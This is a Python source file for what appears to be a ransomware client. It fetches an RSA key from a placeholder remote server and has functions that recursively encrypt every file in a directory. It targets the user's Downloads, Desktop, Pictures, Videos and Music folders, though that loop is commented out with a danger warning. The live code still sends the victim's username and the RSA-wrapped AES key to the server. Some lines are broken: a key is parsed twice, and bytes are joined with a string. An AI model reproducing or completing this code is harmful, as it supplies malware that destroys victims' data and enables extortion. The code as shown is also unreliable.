import socket
import pathlib
from cryptography.hazmat.primitives import serialization
from file import File
#import secrets
#import rsa
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend




def connect_to_server(public_ip, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((public_ip, port))
    return client_socket


def get_all_files(path):
    all_files = []
    dir_path = pathlib.Path(path)

    for item in dir_path.rglob("*"):
        if item.is_file():
            all_files.append(File(item.name, str(item.resolve()), item.stat().st_size))

    return all_files

def encrypt_all_files_in_directory(path, AES_key):
    all_files = get_all_files(path)
    for file in all_files:
        file.encrypt_file(AES_key)

def decrypt_all_files_in_directory(path, AES_key):
    all_files = get_all_files(path)
    for file in all_files:
        file.decrypt_file(AES_key)


def encrypt_aes_key(aes_key_bytes, public_key_pem):
    public_key = serialization.load_pem_public_key(
        public_key_pem,
        backend=default_backend()
    )

    encrypted_aes_key = public_key.encrypt(
        aes_key_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    return base64.b64encode(encrypted_aes_key).decode('utf-8')


def main():
    print("now starting main....")
    server_public_ip = "SERVER_PUBLIC_IP"
    port = 8080

    server_sock = connect_to_server(server_public_ip, port)
    public_key_bytes = server_sock.recv(4096)
    rsa_public_key = serialization.load_pem_public_key(public_key_bytes)


    AES_key_256 = AESGCM.generate_key(bit_length=256)

    base_path = pathlib.Path.home()

    path_additions = [
        "Downloads", "Desktop", "Pictures", "Videos", "Music"]


    #do not execute the following code, very dangurous!!!
    #לא להריץ את הקוד הבא!! מאוד מסוכן!!!
    # for folder in path_additions:
    #     path = base_path / folder
    #     try:
    #         encrypt_all_files_in_directory(path, AES_key_256)
    #     except Exception as e:
    #         print(f"Something went wrong with {path}: {e}")

    username = os.getlogin()
    AES_key_256 = encrypt_aes_key(AES_key_256, rsa_public_key)
    combined_message = username.encode("utf-8") + b"||" + AES_key_256
    server_sock.send(combined_message)
    server_sock.close()


# def test_encrpytion(path, key):
#     encrypt_all_files_in_directory(path, key)
#
# def test_decryption(path, key):
#     decrypt_all_files_in_directory(path, key)


if __name__ == "__main__":
    #key = AESGCM.generate_key(bit_length=256)
    #key = b'?\x96\xf1\xa2\xa9\x82\xcf!\x0cm\n\xa7\x00\x1c\x9b\x84\x89k#X|R\xe0d\'\xdaa"H\x1d\x9b\xae'
    #print(key)
    #path = r"C:\Users\ariel\encryption_test"
    #test_encrpytion(path, key)
    #test_decryption(path, key)
    main()

